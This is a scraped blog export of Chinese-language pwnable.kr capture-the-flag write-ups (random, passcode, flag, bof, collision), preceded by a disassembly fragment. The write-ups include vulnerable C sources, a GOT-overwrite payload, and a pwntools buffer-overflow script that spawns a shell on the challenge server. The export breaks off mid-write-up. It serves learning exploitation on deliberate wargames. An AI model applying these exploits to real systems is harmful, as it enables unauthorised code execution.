89 c7 mov %rax,%rdi 4009e2: f3 a6 repz cmpsb %es:(%rdi),%ds:(%rsi) 4009e4: 0f 97 c2 seta %dl 4009e7: 0f 92 c0 setb %al 4009ea: 89 d1 mov %edx,%ecx 4009ec: 28 c1 sub %al,%cl 4009ee: 89 c8 mov %ecx,%eax 4009f0: 0f be c0 movsbl %al,%eax 4009f3: 85 c0 test %eax,%eax 4009f5: 74 0a je 400a01 &lt;main+0xad&gt; 4009f7: b8 00 00 00 00 mov $0x0,%eax 4009fc: e9 99 02 00 00 jmpq 400c9a &lt;main+0x346&gt; 400a01: bf 2e 0e 40 00 mov $0x400e2e,%edi 400a06: e8 75 fd ff ff callq 400780 &lt;puts@plt&gt; 400a0b: 48 8d 45 f0 lea -0x10(%rbp),%rax 400a0f: ba 04 00 00 00 mov $0x4,%edx 400a14: 48 89 c6 mov %rax,%rsi 400a17: bf 00 00 00 00 mov $0x0,%edi 400a1c: b8 00 00 00 00 mov $0x0,%eax 400a21: e8 ba fd ff ff callq 4007e0 &lt;read@plt&gt; 400a26: 48 8d 45 f0 lea -0x10(%rbp),%rax 400a2a: ba 04 00 00 00 mov $0x4,%edx 400a2f: be 3d 0e 40 00 mov $0x400e3d,%esi 400a34: 48 89 c7 mov %rax,%rdi 400a37: e8 c4 fd ff ff callq 400800 &lt;memcmp@plt&gt; 400a3c: 85 c0 test %eax,%eax 400a3e: 74 0a je 400a4a &lt;main+0xf6&gt; 400a40: b8 00 00 00 00 mov $0x0,%eax 400a45: e9 50 02 00 00 jmpq 400c9a &lt;main+0x346&gt; 400a4a: 48 8d 45 f0 lea -0x10(%rbp),%rax 400a4e: ba 04 00 00 00 mov $0x4,%edx 400a53: 48 89 c6 mov %rax,%rsi 400a56: bf 02 00 00 00 mov $0x2,%edi 400a5b: b8 00 00 00 00 mov $0x0,%eax 400a60: e8 7b fd ff ff callq 4007e0 &lt;read@plt&gt; 400a65: 48 8d 45 f0 lea -0x10(%rbp),%rax 400a69: ba 04 00 00 00 mov $0x4,%edx 400a6e: be 42 0e 40 00 mov $0x400e42,%esi 400a73: 48 89 c7 mov %rax,%rdi 400a76: e8 85 fd ff ff callq 400800 &lt;memcmp@plt&gt; 400a7b: 85 c0 test %eax,%eax 400a7d: 74 0a je 400a89 &lt;main+0x135&gt; 400a7f: b8 00 00 00 00 mov $0x0,%eax 400a84: e9 11 02 00 00 jmpq 400c9a &lt;main+0x346&gt; 400a89: bf 47 0e 40 00 mov $0x400e47,%edi 400a8e: e8 ed fc ff ff callq 400780 &lt;puts@plt&gt; 400a93: bf 56 0e 40 00 mov $0x400e56,%edi 400a98: e8 c3 fc ff ff callq 400760 &lt;getenv@plt&gt; 400a9d: ba 5b 0e 40 00 mov $0x400e5b,%edx 400aa2: b9 05 00 00 00 mov $0x5,%ecx 400aa7: 48 89 d6 mov %rdx,%rsi 400aaa: 48 89 c7 mov %rax,%rdi 400aad: f3 a6 repz cmpsb %es:(%rdi),%ds:(%rsi) 400aaf: 0f 97 c2 seta %dl 400ab2: 0f 92 c0 setb %al 400ab5: 89 d1 mov %edx,%ecx 400ab7: 28 c1 sub %al,%cl 400ab9: 89 c8 mov %ecx,%eax 400abb: 0f be c0 movsbl %al,%eax 400abe: 85 c0 test %eax,%eax 400ac0: 74 0a je 400acc &lt;main+0x178&gt; 400ac2: b8 00 00 00 00 mov $0x0,%eax 400ac7: e9 ce 01 00 00 jmpq 400c9a &lt;main+0x346&gt; 400acc: bf 60 0e 40 00 mov $0x400e60,%edi 400ad1: e8 aa fc ff ff callq 400780 &lt;puts@plt&gt; 400ad6: ba 6f 0e 40 00 mov $0x400e6f,%edx 400adb: b8 71 0e 40 00 mov $0x400e71,%eax 400ae0: 48 89 d6 mov %rdx,%rsi 400ae3: 48 89 c7 mov %rax,%rdi 400ae6: e8 45 fd ff ff callq 400830 &lt;fopen@plt&gt; 400aeb: 48 89 45 b8 mov %rax,-0x48(%rbp) 400aef: 48 83 7d b8 00 cmpq $0x0,-0x48(%rbp) 400af4: 75 0a jne 400b00 &lt;main+0x1ac&gt; 400af6: b8 00 00 00 00 mov $0x0,%eax 400afb: e9 9a 01 00 00 jmpq 400c9a &lt;main+0x346&gt; 400b00: 48 8d 45 f0 lea -0x10(%rbp),%rax 400b04: 48 8b 55 b8 mov -0x48(%rbp),%rdx 400b08: 48 89 d1 mov %rdx,%rcx 400b0b: ba 01 00 00 00 mov $0x1,%edx 400b10: be 04 00 00 00 mov $0x4,%esi 400b15: 48 89 c7 mov %rax,%rdi 400b18: e8 73 fc ff ff callq 400790 &lt;fread@plt&gt; 400b1d: 48 83 f8 01 cmp $0x1,%rax 400b21: 74 0a je 400b2d &lt;main+0x1d9&gt; 400b23: b8 00 00 00 00 mov $0x0,%eax 400b28: e9 6d 01 00 00 jmpq 400c9a &lt;main+0x346&gt; 400b2d: 48 8d 45 f0 lea -0x10(%rbp),%rax 400b31: ba 04 00 00 00 mov $0x4,%edx 400b36: be 73 0e 40 00 mov $0x400e73,%esi 400b3b: 48 89 c7 mov %rax,%rdi 400b3e: e8 bd fc ff ff callq 400800 &lt;memcmp@plt&gt; 400b43: 85 c0 test %eax,%eax 400b45: 74 0a je 400b51 &lt;main+0x1fd&gt; 400b47: b8 00 00 00 00 mov $0x0,%eax 400b4c: e9 49 01 00 00 jmpq 400c9a &lt;main+0x346&gt; 400b51: 48 8b 45 b8 mov -0x48(%rbp),%rax 400b55: 48 89 c7 mov %rax,%rdi 400b58: e8 43 fc ff ff callq 4007a0 &lt;fclose@plt&gt; 400b5d: bf 78 0e 40 00 mov $0x400e78,%edi 400b62: e8 19 fc ff ff callq 400780 &lt;puts@plt&gt; 400b67: ba 00 00 00 00 mov $0x0,%edx 400b6c: be 01 00 00 00 mov $0x1,%esi 400b71: bf 02 00 00 00 mov $0x2,%edi 400b76: e8 e5 fc ff ff callq 400860 &lt;socket@plt&gt; 400b7b: 89 45 c8 mov %eax,-0x38(%rbp) 400b7e: 83 7d c8 ff cmpl $0xffffffff,-0x38(%rbp) 400b82: 75 14 jne 400b98 &lt;main+0x244&gt; 400b84: bf 87 0e 40 00 mov $0x400e87,%edi 400b89: e8 f2 fb ff ff callq 400780 &lt;puts@plt&gt; 400b8e: b8 00 00 00 00 mov $0x0,%eax 400b93: e9 02 01 00 00 jmpq 400c9a &lt;main+0x346&gt; 400b98: 66 c7 45 d0 02 00 movw $0x2,-0x30(%rbp) 400b9e: c7 45 d4 00 00 00 00 movl $0x0,-0x2c(%rbp) 400ba5: 48 8b 45 a0 mov -0x60(%rbp),%rax 400ba9: 48 05 18 02 00 00 add $0x218,%rax 400baf: 48 8b 00 mov (%rax),%rax 400bb2: 48 89 c7 mov %rax,%rdi 400bb5: e8 96 fc ff ff callq 400850 &lt;atoi@plt&gt; 400bba: 0f b7 c0 movzwl %ax,%eax 400bbd: 89 c7 mov %eax,%edi 400bbf: e8 0c fc ff ff callq 4007d0 &lt;htons@plt&gt; 400bc4: 66 89 45 d2 mov %ax,-0x2e(%rbp) 400bc8: 48 8d 4d d0 lea -0x30(%rbp),%rcx 400bcc: 8b 45 c8 mov -0x38(%rbp),%eax 400bcf: ba 10 00 00 00 mov $0x10,%edx 400bd4: 48 89 ce mov %rcx,%rsi 400bd7: 89 c7 mov %eax,%edi 400bd9: e8 42 fc ff ff callq 400820 &lt;bind@plt&gt; 400bde: 85 c0 test %eax,%eax 400be0: 79 14 jns 400bf6 &lt;main+0x2a2&gt; 400be2: bf a0 0e 40 00 mov $0x400ea0,%edi 400be7: e8 94 fb ff ff callq 400780 &lt;puts@plt&gt; 400bec: b8 01 00 00 00 mov $0x1,%eax 400bf1: e9 a4 00 00 00 jmpq 400c9a &lt;main+0x346&gt; 400bf6: 8b 45 c8 mov -0x38(%rbp),%eax 400bf9: be 01 00 00 00 mov $0x1,%esi 400bfe: 89 c7 mov %eax,%edi 400c00: e8 0b fc ff ff callq 400810 &lt;listen@plt&gt; 400c05: c7 45 c4 10 00 00 00 movl $0x10,-0x3c(%rbp) 400c0c: 48 8d 55 c4 lea -0x3c(%rbp),%rdx 400c10: 48 8d 4d e0 lea -0x20(%rbp),%rcx 400c14: 8b 45 c8 mov -0x38(%rbp),%eax 400c17: 48 89 ce mov %rcx,%rsi 400c1a: 89 c7 mov %eax,%edi 400c1c: e8 1f fc ff ff callq 400840 &lt;accept@plt&gt; 400c21: 89 45 cc mov %eax,-0x34(%rbp) 400c24: 83 7d cc 00 cmpl $0x0,-0x34(%rbp) 400c28: 79 11 jns 400c3b &lt;main+0x2e7&gt; 400c2a: bf bd 0e 40 00 mov $0x400ebd,%edi 400c2f: e8 4c fb ff ff callq 400780 &lt;puts@plt&gt; 400c34: b8 00 00 00 00 mov $0x0,%eax 400c39: eb 5f jmp 400c9a &lt;main+0x346&gt; 400c3b: 48 8d 75 f0 lea -0x10(%rbp),%rsi 400c3f: 8b 45 cc mov -0x34(%rbp),%eax 400c42: b9 00 00 00 00 mov $0x0,%ecx 400c47: ba 04 00 00 00 mov $0x4,%edx 400c4c: 89 c7 mov %eax,%edi 400c4e: e8 1d fb ff ff callq 400770 &lt;recv@plt&gt; 400c53: 48 83 f8 04 cmp $0x4,%rax 400c57: 74 07 je 400c60 &lt;main+0x30c&gt; 400c59: b8 00 00 00 00 mov $0x0,%eax 400c5e: eb 3a jmp 400c9a &lt;main+0x346&gt; 400c60: 48 8d 45 f0 lea -0x10(%rbp),%rax 400c64: ba 04 00 00 00 mov $0x4,%edx 400c69: be 56 0e 40 00 mov $0x400e56,%esi 400c6e: 48 89 c7 mov %rax,%rdi 400c71: e8 8a fb ff ff callq 400800 &lt;memcmp@plt&gt; 400c76: 85 c0 test %eax,%eax 400c78: 74 07 je 400c81 &lt;main+0x32d&gt; 400c7a: b8 00 00 00 00 mov $0x0,%eax 400c7f: eb 19 jmp 400c9a &lt;main+0x346&gt; 400c81: bf d6 0e 40 00 mov $0x400ed6,%edi 400c86: e8 f5 fa ff ff callq 400780 &lt;puts@plt&gt; 400c8b: bf e5 0e 40 00 mov $0x400ee5,%edi 400c90: e8 2b fb ff ff callq 4007c0 &lt;system@plt&gt; 400c95: b8 00 00 00 00 mov $0x0,%eax 400c9a: 48 8b 75 f8 mov -0x8(%rbp),%rsi 400c9e: 64 48 33 34 25 28 00 xor %fs:0x28,%rsi 400ca5: 00 00 400ca7: 74 05 je 400cae &lt;main+0x35a&gt; 400ca9: e8 02 fb ff ff callq 4007b0 &lt;__stack_chk_fail@plt&gt; 400cae: c9 leaveq 400caf: c3 retq","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://hanqd.github.io/tags/pwn/"}]},{"title":"pwnable.kr-random","slug":"pwnable random","date":"2019-05-24T09:45:52.425Z","updated":"2019-05-24T12:04:30.544Z","comments":true,"path":"2019/05/24/pwnable random/","link":"","permalink":"https://hanqd.github.io/2019/05/24/pwnable random/","excerpt":"pwnable.kr random涉及知识点：rand()函数。","text":"pwnable.kr random涉及知识点：rand()函数。 题目描述123Daddy, teach me how to use random value in programming!ssh random@pwnable.kr -p2222 (pw:guest) 题目的意思是在程序中使用随机值。 题目分析 同样，远程访问random用户。有三个文件：random、random.c、flag 查看random.c文件 123456789101112131415161718#include &lt;stdio.h&gt;int main()&#123; unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(\"%d\", &amp;key); if( (key ^ random) == 0xdeadbeef )&#123; printf(\"Good!\\n\"); system(\"/bin/cat flag\"); return 0; &#125; printf(\"Wrong, maybe you should try 2^32 cases.\\n\"); return 0;&#125; 根据程序，只要输入的key值与random随机值异或等于0xdeadbeef，即可得到flag。 看rand()函数。 rand函数不是真正的随机数生成器，而srand()会设置供rand()使用的随机数种子。如果你在第一次调用rand()之前没有调用srand()，那么系统会为你自动调用srand()。而使用同种子相同的数调用 rand()会导致相同的随机数序列被生成。 也就是说，没有调用srand()函数，没有设置随机数种子，rand()函数就只会生成一个随机数，且不会变。 查看产生的随机数 12345678#include &lt;stdio.h&gt;int main()&#123; unsigned int random; random = rand(); printf(\"%d\",random); return 0;&#125; 运行得到1804289383，十六进制为0x6b8b4567.与0xdeadbeef进行异或，得到3039230856，运行输入得到flag。 1234random@ubuntu:~$ ./random3039230856Good!Mommy, I thought libc random is unpredictable...","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://hanqd.github.io/tags/pwn/"}]},{"title":"pwnable.kr-passcode","slug":"pwnable passcode","date":"2019-05-23T12:40:09.829Z","updated":"2019-05-23T12:41:14.718Z","comments":true,"path":"2019/05/23/pwnable passcode/","link":"","permalink":"https://hanqd.github.io/2019/05/23/pwnable passcode/","excerpt":"pwnable.kr-passcode这道题目有难度，之前没有遇到过，查看其他人写的writeup，有了解题思路，顺着做了一遍，加深理解。涉及知识点：scanf函数漏洞、GOT覆写技术、gdb调试参考：https://blog.csdn.net/smalosnail/article/details/53247502","text":"pwnable.kr-passcode这道题目有难度，之前没有遇到过，查看其他人写的writeup，有了解题思路，顺着做了一遍，加深理解。涉及知识点：scanf函数漏洞、GOT覆写技术、gdb调试参考：https://blog.csdn.net/smalosnail/article/details/53247502 题目描述12345Mommy told me to make a passcode based login system.My initial C code was compiled without any error!Well, there was some compiler warning, but who cares about that?ssh passcode@pwnable.kr -p2222 (pw:guest) 题目说要建立一个基于密码的登录系统，源代码C在编译时有警告。同样给出SSH远程登录的命令。 题目分析 远程登录用户机同前边的第一道题一样，有三个文件flag passcode passcode.c 查看passcode.c代码 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf(\"enter passcode1 : \"); scanf(\"%d\", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(\"enter passcode2 : \"); scanf(\"%d\", passcode2); printf(\"checking...\\n\"); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123; printf(\"Login OK!\\n\"); system(\"/bin/cat flag\"); &#125; else&#123; printf(\"Login Failed!\\n\"); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf(\"enter you name : \"); scanf(\"%100s\", name); printf(\"Welcome %s!\\n\", name);&#125;int main()&#123; printf(\"Toddler's Secure Login System 1.0 beta.\\n\"); welcome(); login(); // something after login... printf(\"Now I can safely trust you that you have credential :)\\n\"); return 0; &#125; 程序很好理解，有三个函数，login、welcome、main函数，在主函数中，先调用welcome函数，在调用login函数，其中welcome函数中就调用scanf函数输入name，关键的就在login函数，输入另个数，使得passcode1==338150 &amp;&amp; passcode2==13371337就会得到flag。 这里的scanf(“%d”, passcode1)，少了‘&amp;’，取地址的符号，这里就默认从存放passcode1数据的栈中取4个字节当做scanf取的地址（本来scanf是取存放passcode1的地址，现在取的是passcode1的数据）。这里存在scanf漏洞。 解题思路利用GOT覆写技术，把scanf该取的passcode1地址改为其他函数的地址，如fflush函数，把 system(“/bin/cat flag”)这条指令写入这个函数中，那么在调用这个函数时，就能执行system函数了，从而得到flag。根据代码可以看出，这里是把输入psaacode1和passcode2绕过了，从而防止scanf错误出现。 查看login函数的反汇编代码 12345678910111213141516171819202122232425262728293031323334353637383908048564 &lt;login&gt;: 8048564: 55 push %ebp 8048565: 89 e5 mov %esp,%ebp 8048567: 83 ec 28 sub $0x28,%esp 804856a: b8 70 87 04 08 mov $0x8048770,%eax 804856f: 89 04 24 mov %eax,(%esp) 8048572: e8 a9 fe ff ff call 8048420 &lt;printf@plt&gt; 8048577: b8 83 87 04 08 mov $0x8048783,%eax 804857c: 8b 55 f0 mov -0x10(%ebp),%edx 804857f: 89 54 24 04 mov %edx,0x4(%esp) 8048583: 89 04 24 mov %eax,(%esp) 8048586: e8 15 ff ff ff call 80484a0 &lt;__isoc99_scanf@plt&gt; 804858b: a1 2c a0 04 08 mov 0x804a02c,%eax 8048590: 89 04 24 mov %eax,(%esp) 8048593: e8 98 fe ff ff call 8048430 &lt;fflush@plt&gt; 8048598: b8 86 87 04 08 mov $0x8048786,%eax 804859d: 89 04 24 mov %eax,(%esp) 80485a0: e8 7b fe ff ff call 8048420 &lt;printf@plt&gt; 80485a5: b8 83 87 04 08 mov $0x8048783,%eax 80485aa: 8b 55 f4 mov -0xc(%ebp),%edx 80485ad: 89 54 24 04 mov %edx,0x4(%esp) 80485b1: 89 04 24 mov %eax,(%esp) 80485b4: e8 e7 fe ff ff call 80484a0 &lt;__isoc99_scanf@plt&gt; 80485b9: c7 04 24 99 87 04 08 movl $0x8048799,(%esp) 80485c0: e8 8b fe ff ff call 8048450 &lt;puts@plt&gt; 80485c5: 81 7d f0 e6 28 05 00 cmpl $0x528e6,-0x10(%ebp) 80485cc: 75 23 jne 80485f1 &lt;login+0x8d&gt; 80485ce: 81 7d f4 c9 07 cc 00 cmpl $0xcc07c9,-0xc(%ebp) 80485d5: 75 1a jne 80485f1 &lt;login+0x8d&gt; 80485d7: c7 04 24 a5 87 04 08 movl $0x80487a5,(%esp) 80485de: e8 6d fe ff ff call 8048450 &lt;puts@plt&gt; 80485e3: c7 04 24 af 87 04 08 movl $0x80487af,(%esp) 80485ea: e8 71 fe ff ff call 8048460 &lt;system@plt&gt; 80485ef: c9 leave 80485f0: c3 ret 80485f1: c7 04 24 bd 87 04 08 movl $0x80487bd,(%esp) 80485f8: e8 53 fe ff ff call 8048450 &lt;puts@plt&gt; 80485fd: c7 04 24 00 00 00 00 movl $0x0,(%esp) 8048604: e8 77 fe ff ff call 8048480 &lt;exit@plt&gt; 80485e3: c7 04 24 af 87 04 08 movl $0x80487af,(%esp)这里是把”/bin/cat flag”入栈，那么就把0x80485e3写入fflush函数中。 查看fflush函数在GOT表中的位置： 1234567891011121314151617passcode@ubuntu:~$ objdump -R passcodepasscode: file format elf32-i386DYNAMIC RELOCATION RECORDSOFFSET TYPE VALUE 08049ff0 R_386_GLOB_DAT __gmon_start__0804a02c R_386_COPY stdin@@GLIBC_2.00804a000 R_386_JUMP_SLOT printf@GLIBC_2.00804a004 R_386_JUMP_SLOT fflush@GLIBC_2.00804a008 R_386_JUMP_SLOT __stack_chk_fail@GLIBC_2.40804a00c R_386_JUMP_SLOT puts@GLIBC_2.00804a010 R_386_JUMP_SLOT system@GLIBC_2.00804a014 R_386_JUMP_SLOT __gmon_start__0804a018 R_386_JUMP_SLOT exit@GLIBC_2.00804a01c R_386_JUMP_SLOT __libc_start_main@GLIBC_2.00804a020 R_386_JUMP_SLOT __isoc99_scanf@GLIBC_2.7 需要把0x80485e3覆盖掉在0x0804a004位置的fflush函数的GOT表。GOT覆写技术：由于GOT表是可写的，把其中的函数地址覆盖为我们shellcode地址，在程序进行调用这个函数时就会执行shellcode。 构造填充数据发现welcome（）和login（）共同使用一个共享栈，也就是说，两个函数使用同一个ebp，先调用welcome的话，name所占空间也被算在里边。 12345678910111213(gdb) break welcome()Function \"welcome()\" not defined.Make breakpoint pending on future shared library load? (y or [n]) yBreakpoint 2 (welcome()) pending.(gdb) i r ebpebp 0xffadff48 0xffadff48(gdb) break login()Function \"login()\" not defined.Make breakpoint pending on future shared library load? (y or [n]) yBreakpoint 4 (login()) pending.(gdb) i r ebpebp 0xffadff48 0xffadff48 查看welcome函数的反汇编代码，找name所占空间。 -0x70(%ebp),%edx，ebp-0x70就是name的地址，0x70即为name所占空间。 123456789101112131415161718192021222324252608048609 &lt;welcome&gt;: 8048609: 55 push %ebp 804860a: 89 e5 mov %esp,%ebp 804860c: 81 ec 88 00 00 00 sub $0x88,%esp 8048612: 65 a1 14 00 00 00 mov %gs:0x14,%eax 8048618: 89 45 f4 mov %eax,-0xc(%ebp) 804861b: 31 c0 xor %eax,%eax 804861d: b8 cb 87 04 08 mov $0x80487cb,%eax 8048622: 89 04 24 mov %eax,(%esp) 8048625: e8 f6 fd ff ff call 8048420 &lt;printf@plt&gt; 804862a: b8 dd 87 04 08 mov $0x80487dd,%eax 804862f: 8d 55 90 lea -0x70(%ebp),%edx 8048632: 89 54 24 04 mov %edx,0x4(%esp) 8048636: 89 04 24 mov %eax,(%esp) 8048639: e8 62 fe ff ff call 80484a0 &lt;__isoc99_scanf@plt&gt; 804863e: b8 e3 87 04 08 mov $0x80487e3,%eax 8048643: 8d 55 90 lea -0x70(%ebp),%edx 8048646: 89 54 24 04 mov %edx,0x4(%esp) 804864a: 89 04 24 mov %eax,(%esp) 804864d: e8 ce fd ff ff call 8048420 &lt;printf@plt&gt; 8048652: 8b 45 f4 mov -0xc(%ebp),%eax 8048655: 65 33 05 14 00 00 00 xor %gs:0x14,%eax 804865c: 74 05 je 8048663 &lt;welcome+0x5a&gt; 804865e: e8 dd fd ff ff call 8048440 &lt;__stack_chk_fail@plt&gt; 8048663: c9 leave 8048664: c3 ret passcode1（login函数的反汇编代码可以看出）的位置为ebp-0x10，那么从name到passcode1所占范围为：0x70-0x10=0x60=96，name要求输入100个字节，那么name的最后4个字节就会被当做是passcode1的地址，也就是这里fflush函数的地址。paylode:‘a’*96+p32(fflush_got)+str(sys_addr)‘a’*96+p32(0x0804a004)+str(0x80485e3) 输入命令： python -c “print ‘A’ * 96 + ‘\\x00\\xa0\\x04\\x08’ + ‘134514147\\n’” | ./passcode得到flag：Sorry mom.. I got confused about scanf usage :(","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://hanqd.github.io/tags/pwn/"}]},{"title":"pwnable.kr-flag","slug":"pwnable flag","date":"2019-05-22T09:30:53.552Z","updated":"2019-05-22T09:32:27.260Z","comments":true,"path":"2019/05/22/pwnable flag/","link":"","permalink":"https://hanqd.github.io/2019/05/22/pwnable flag/","excerpt":"pwnable.kr-flag这是一道逆向题目，所用知识点:upx加壳脱壳。","text":"pwnable.kr-flag这是一道逆向题目，所用知识点:upx加壳脱壳。 题目描述12345Papa brought me a packed present! let's open it.Download : http://pwnable.kr/bin/flagThis is reversing task. all you need is binary 题目分析 根据题目提示，先用objdump命令反汇编以下文件，发现不行，错误提示： 1flag: file format elf64-x86-64 文件是64位的elf文件 用IDA打开，查看其二进制文件，根据题目提示，这是一个包，是不是被包装了？在二进制文件中发现了upx关键字！ 1234seg000:00000000000000B4 db 55h ; Useg000:00000000000000B5 db 50h ; Pseg000:00000000000000B6 db 58h ; Xseg000:00000000000000B7 db 21h ; ! 或者用checksec命令，检查保护机制：123456789hdd@ubuntu:~/Desktop/flag$ checksec flag[*] '/home/hdd/Desktop/flag/flag' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Packer: Packed with UPX 百度百科解释upx: UPX (the Ultimate Packer for eXecutables)是一款先进的可执行程序文件压缩器，压缩过的可执行文件体积缩小50%-70% ，这样减少了磁盘占用空间、网络上传下载的时间和其它分布以及存储费用。 通过 UPX 压缩过的程序和程序库完全没有功能损失和压缩之前一样可正常地运行，对于支持的大多数格式没有运行时间或内存的不利后果。 UPX 支持许多不同的可执行文件格式 包含 Windows 95/98/ME/NT/2000/XP/CE 程序和动态链接库、DOS 程序、 Linux 可执行文件和核心。 加壳： 对于可执行程序资源压缩,是保护文件的常用手段. 俗称加壳,加壳过的程序可以直接运行,但是不能查看源代码.要经过脱壳才可以查看源代码.加壳：其实是利用特殊的算法，对EXE、DLL文件里的资源进行压缩。类似WINZIP 的效果，只不过这个压缩之后的文件，可以独立运行，解压过程完全隐蔽，都在内存中完成。解压原理，是加壳工具在文件头里加了一段指令，告诉CPU，怎么才能解压自己。当加壳时，其实就是给可执行的文件加上个外衣。用户执行的只是这个外壳程序。当执行这个程序的时候这个壳就会把原来的程序在内存中解开，解开后，以后的就交给真正的程序。 脱壳在Ubuntu上执行upx -d flag失败，直接在Windows系统上下载upx，进行脱壳，执行后，再重新在IDA中打开flag文件，发现了flag：UPX…? sounds like a delivery service :)","categories":[],"tags":[{"name":"reverse","slug":"reverse","permalink":"https://hanqd.github.io/tags/reverse/"}]},{"title":"pwnable.kr-bof","slug":"pwnable bof","date":"2019-05-21T09:41:10.097Z","updated":"2019-05-21T12:26:45.344Z","comments":true,"path":"2019/05/21/pwnable bof/","link":"","permalink":"https://hanqd.github.io/2019/05/21/pwnable bof/","excerpt":"pwnable.kr-bof昨天整理了一下论文，打印上交，把答辩PPT做完，没有做题。","text":"pwnable.kr-bof昨天整理了一下论文，打印上交，把答辩PPT做完，没有做题。 题目描述1234567Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?Download : http://pwnable.kr/bin/bofDownload : http://pwnable.kr/bin/bof.cRunning at : nc pwnable.kr 9000 题目中看到这是一道栈溢出问题。 题目分析因为之前做过栈溢出的题目，所以有一定了解。 先下载文件在Linux系统中命令：wget +网址 12hdd@ubuntu:~/Desktop/bof$ wget http://pwnable.kr/bin/bofhdd@ubuntu:~/Desktop/bof$ wget http://pwnable.kr/bin/bof.c 查看bof.c文件 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf(\"overflow me : \"); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system(\"/bin/sh\"); &#125; else&#123; printf(\"Nah..\\n\"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; 分析代码，找到会发生溢出的函数，gets(),这里没有对输入进行限制，会造成缓冲区溢出。只要使key值等于0xcafebabe，就会得到系统shell，获得flag。 查看一下bof的反汇编代码，查看func()的反汇编代码 123456789101112131415161718192021222324250000062c &lt;func&gt;: 62c: 55 push %ebp 62d: 89 e5 mov %esp,%ebp 62f: 83 ec 48 sub $0x48,%esp 632: 65 a1 14 00 00 00 mov %gs:0x14,%eax 638: 89 45 f4 mov %eax,-0xc(%ebp) 63b: 31 c0 xor %eax,%eax 63d: c7 04 24 8c 07 00 00 movl $0x78c,(%esp) 644: e8 fc ff ff ff call 645 &lt;func+0x19&gt; 649: 8d 45 d4 lea -0x2c(%ebp),%eax 64c: 89 04 24 mov %eax,(%esp) 64f: e8 fc ff ff ff call 650 &lt;func+0x24&gt; 654: 81 7d 08 be ba fe ca cmpl $0xcafebabe,0x8(%ebp) 65b: 75 0e jne 66b &lt;func+0x3f&gt; 65d: c7 04 24 9b 07 00 00 movl $0x79b,(%esp) 664: e8 fc ff ff ff call 665 &lt;func+0x39&gt; 669: eb 0c jmp 677 &lt;func+0x4b&gt; 66b: c7 04 24 a3 07 00 00 movl $0x7a3,(%esp) 672: e8 fc ff ff ff call 673 &lt;func+0x47&gt; 677: 8b 45 f4 mov -0xc(%ebp),%eax 67a: 65 33 05 14 00 00 00 xor %gs:0x14,%eax 681: 74 05 je 688 &lt;func+0x5c&gt; 683: e8 fc ff ff ff call 684 &lt;func+0x58&gt; 688: c9 leave 689: c3 ret 从649那可以看出，局部变量的地址为edp-0x2c，从654看出，key值的地址在edp+x8，因为是32位的文件，所以构造如下数据进行填充：payload=&#39;a&#39;*44+&#39;a&#39;*8+p32(0xcafebabe) 脚本代码 12345from pwn import *r=remote('pwnable.kr',9000)payload='a'*44+'a'*8+p32(0xcafebabe)r.sendline(payload)r.interactive() 运行脚本，获得flag 123456789101112hdd@ubuntu:~/Desktop/bof$ python bof.py[+] Opening connection to pwnable.kr on port 9000: Done[*] Switching to interactive mode$ lsbofbof.cflagloglog2super.pl$ cat flagdaddy, I just pwned a buFFer :)","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://hanqd.github.io/tags/pwn/"}]},{"title":"pwnable.kr-collision","slug":"pwnable-collision","date":"2019-05-19T12:59:43.203Z","updated":"2019-05-19T13:00:51.298Z","comments":true,"path":"2019/05/19/pwnable-collision/","link":"","permalink":"https://hanqd.github.io/2019/05/19/pwnable-collision/","excerpt":"pwnable.kr-collision这道题目与第一道题目做题步骤差不多，直接查看源码，再往下做即可，这里涉及的知识点是MD5碰撞。","text":"pwnable.kr-collision这道题目与第一道题目做题步骤差不多，直接查看源码，再往下做即可，这里涉及的知识点是MD5碰撞。 题目描述123Daddy told me about cool MD5 hash collision today.I wanna do something like that too!ssh col@pwnable.kr -p2222 (pw:guest) 照样给了一行远程登录命令ssh col@pwnable.kr -p2222 (pw:guest) 题目分析 远程登录，输入命令：ssh col@pwnable.kr -p 2222，输入密码：guest，以col用户的身份进入端口为2222的主机。 查看col.c源代码 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf(\"passcode length should be 20 bytes\\n\"); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system(\"/bin/cat flag\"); return 0; &#125; else printf(\"wrong passcode.\\n\"); return 0;&#125; 分析代码代码中 hashcode = 0x21DD09EC，主函数中需要输入的参数长度是20个字节，再看if语句，只要check_password( argv[1] )等于0x21DD09EC就会获得flag，主要看check_password函数，函数的功能是把输入的char类型的参数p强制转换为int型，char类型是1个字节，int类型的是4个字节，要求输入20个字节，四个一组（int型），一共5组，和for循环对应起来，意思就是5个int类型的数相加结果为0x21DD09EC。假设其中四个数是0x01010101，那另一个数就是0x21DD09EC-0x01010101*4，结果为：查看col文件类型，得知cup是80386，存储方式为小端存储，则在输入上面的五个数时，注意输入顺序。这里的Python指令要用反引号` 